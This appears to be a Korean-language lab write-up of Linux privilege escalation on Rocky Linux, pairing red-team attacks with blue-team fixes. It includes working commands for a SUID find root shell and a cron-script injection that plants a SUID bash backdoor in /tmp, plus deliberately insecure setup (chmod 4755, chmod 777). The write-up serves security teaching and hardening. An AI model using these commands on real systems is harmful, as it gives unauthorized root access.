🛡️ Linux Privilege Escalation Lab: Red/Blue Team Scenarios
📝 개요 (Overview)
본 프로젝트는 엔터프라이즈 환경에서 널리 사용되는 RHEL 계열 운영체제(Rocky Linux)를 대상으로 리눅스 시스템의 대표적인 권한 상승(Privilege Escalation) 취약점 2가지를 분석하고 대응 방안을 적용한 실습 기록입니다. 공격자(Red Team)의 관점에서 초기 침투 후 루트(root) 권한을 획득하는 과정을 시연하고, 방어자(Blue Team)의 관점에서 해당 취약점을 조치하는 일련의 킬 체인(Kill Chain)을 다룹니다.

🏗️ 실습 환경 (Environment)
Attacker (Red Team): Kali Linux

Target (Blue Team): Rocky Linux 9.x

Initial Access: 패스워드 크래킹을 통해 획득한 일반 계정(user) 자격 증명으로 SSH 접속 성공 상태

<img width="613" height="319" alt="image" src="https://github.com/user-attachments/assets/12c4d79d-4f0e-47e1-a115-0d7df95a961f" />


🚀 Scenario 1: 잘못 설정된 SUID 악용 (find 명령어)
SUID(Set-owner-User-ID)는 실행 파일이 동작하는 동안 파일 소유자의 권한을 임시로 획득하게 해주는 속성입니다. 관리자의 실수로 시스템 기본 명령어에 SUID가 부여되었을 때 발생하는 보안 위협을 실습합니다.

1. 취약점 구성 (Red Team)
관리자가 편의상 find 명령어의 복사본을 만들고 SUID를 부여한 상황을 가정합니다.


mkdir -p /home/user/vuln_env
cp /usr/bin/find /home/user/vuln_env/find
chown root:root /home/user/vuln_env/find
chmod 4755 /home/user/vuln_env/find
ls -l /home/user/vuln_env/find
<img width="1034" height="125" alt="image" src="https://github.com/user-attachments/assets/f6b4c9f5-e701-4103-aed7-7d94eb1198b3" />


2. 취약점 탐색 및 공격 (Red Team)
일반 계정으로 접속한 공격자는 시스템 내 SUID가 설정된 파일을 검색하여 취약점을 식별하고 루트 쉘을 실행합니다.


# SUID 파일 검색 (오류 메시지 제외)
find / -perm -4000 -type f 2>/dev/null

<img width="548" height="382" alt="image" src="https://github.com/user-attachments/assets/ff0710c3-bc70-4fe9-a763-bc7b75938052" />



# 권한 상승 공격 (-p 옵션으로 쉘의 권한 강등 보호 기법 우회)
/home/user/vuln_env/find . -exec /bin/sh -p \; -quit
whoami
id
<img width="628" height="131" alt="image" src="https://github.com/user-attachments/assets/443111e3-fc04-42ed-9652-70ac63245d5d" />


3. 보안 조치 (Blue Team)
불필요하게 부여된 SUID 권한을 즉시 회수하여 취약점을 제거합니다.


chmod u-s /home/user/vuln_env/find
ls -l /home/user/vuln_env/find
<img width="680" height="80" alt="image" src="https://github.com/user-attachments/assets/2b587c5b-9294-4985-99e8-cd5a346ff3d0" />


🚀 Scenario 2: 취약한 Cron Job 악용
Cron은 주기적으로 작업을 실행하는 데몬입니다. root 권한으로 실행되는 자동화 스크립트 파일에 일반 사용자의 쓰기 권한이 허용되어 있을 때 발생하는 권한 상승 취약점입니다.

1. 취약점 구성 (Red Team)
누구나 수정할 수 있는 백업 스크립트가 1분마다 root 권한으로 실행되도록 크론탭에 등록된 상황을 가정합니다.


echo '#!/bin/bash' > /usr/local/bin/backup.sh
echo 'tar -czf /tmp/backup.tar.gz /etc/hosts' >> /usr/local/bin/backup.sh
chmod 777 /usr/local/bin/backup.sh
echo "* * * * * root /usr/local/bin/backup.sh" >> /etc/crontab
<img width="807" height="47" alt="image" src="https://github.com/user-attachments/assets/73ab61be-ed80-4a38-a093-60b96ea302ad" />


2. 악성 스크립트 삽입 및 권한 획득 (Red Team)
공격자는 스크립트에 쓰기 권한이 있는 것을 확인하고, root 권한의 쉘 복사본을 생성해 SUID를 부여하는 악성 페이로드를 주입합니다.


# 악성 페이로드 주입 및 확인
echo 'cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash' >> /usr/local/bin/backup.sh
cat /usr/local/bin/backup.sh
<img width="624" height="161" alt="image" src="https://github.com/user-attachments/assets/2d85e0b4-efb2-460c-a1a4-e425ba8baffe" />


# 1분 대기 후 생성된 백도어 쉘 실행
ls -l /tmp/rootbash
/tmp/rootbash -p
whoami
id
<img width="578" height="43" alt="image" src="https://github.com/user-attachments/assets/f0a99d06-6948-4eaf-8693-359ccfd1848d" />


3. 보안 조치 (Blue Team)
스크립트의 권한을 root만 수정할 수 있도록 제한하고, 공격자가 생성한 악성 파일 및 크론탭 설정을 삭제합니다.


chmod 755 /usr/local/bin/backup.sh
rm -f /tmp/rootbash /tmp/backup.tar.gz
sed -i '/backup.sh/d' /etc/crontab
<img width="722" height="84" alt="image" src="https://github.com/user-attachments/assets/2e8848c3-e96f-4910-a230-82c79e5d28d5" />


💡 인사이트 및 방어 전략 (Conclusion)
본 실습을 통해 내부망에 침투한 공격자가 시스템 환경의 사소한 설정 오류를 통해 어떻게 최고 권한을 탈취하는지 확인했습니다.

최소 권한의 원칙(PoLP): 관리자 편의를 위해 설정된 과도한 권한(SUID, 777)은 공격자의 가장 확실한 백도어가 됩니다. 실행 파일과 쉘 스크립트는 반드시 필요한 권한만 부여해야 합니다.

주기적인 권한 감사: find 명령어를 이용한 정기적인 SUID 파일 검사 및 Cron/시스템 서비스 스크립트의 소유자/퍼미션 점검이 필수적입니다.

마운트 옵션 활용: /tmp나 사용자 디렉토리 등 임시 저장소에는 nosuid 마운트 옵션을 적용하여, 해당 경로에서 SUID 파일이 실행되더라도 권한이 상승하지 않도록 2차 방어선을 구축해야 합니다.
